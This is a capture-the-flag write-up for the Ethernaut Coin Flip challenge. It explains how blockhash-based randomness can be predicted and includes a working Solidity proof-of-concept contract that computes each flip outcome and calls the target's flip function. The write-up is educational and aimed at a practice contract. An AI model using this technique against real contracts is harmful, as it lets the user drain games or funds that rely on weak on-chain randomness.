# ⚙️ Challenge: Ethernaut – 03.Coin-flip

## Exploit Idea: Predictable Randomness

In this challenge, the idea is to exploit **weak randomness** based on `blockhash`.

---

## Concept Summary

We utilize the fact that:

```solidity
uint256(blockhash(block.number - 1)) / 2**255
```

...will always return either `0` or `1`, effectively leaking the most significant bit of the previous block hash — a weakness that can be exploited to predict the outcome of a coin flip.

---

## Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

event CoinFlipResult(bool result);

contract GetBlockNumberAndHash {

    // Return previous block number
    function getBlockNumer() public view returns (uint256) {
        return block.number - 1;
    }

    // Predict the coin flip result and call the vulnerable contract
    function getCoinFlipPredit() public returns (bool success, bytes memory data) {
        bool predit = 1 == (
            uint256(blockhash(block.number - 1)) /
            57896044618658097711785492504343953926634992332820282019728792003956564819968
        );

        // Hardcoded vulnerable contract address (deployed separately)
        address coinFlipAddress = 0xA0376e3976A6A8Cc4422B88Bb63A1E97Ed846031;

        // Use low-level call to trigger `flip(bool)` function
        (success, data) = coinFlipAddress.call(
            abi.encodeWithSignature("flip(bool)", predit)
        );

        return (success, data);
    }
}
```

---

## Notes

- `FACTOR = 2^255` is used to extract the highest bit from the 256-bit blockhash.
- The `call` method is used here to avoid needing a formal interface, ideal for quick testing.
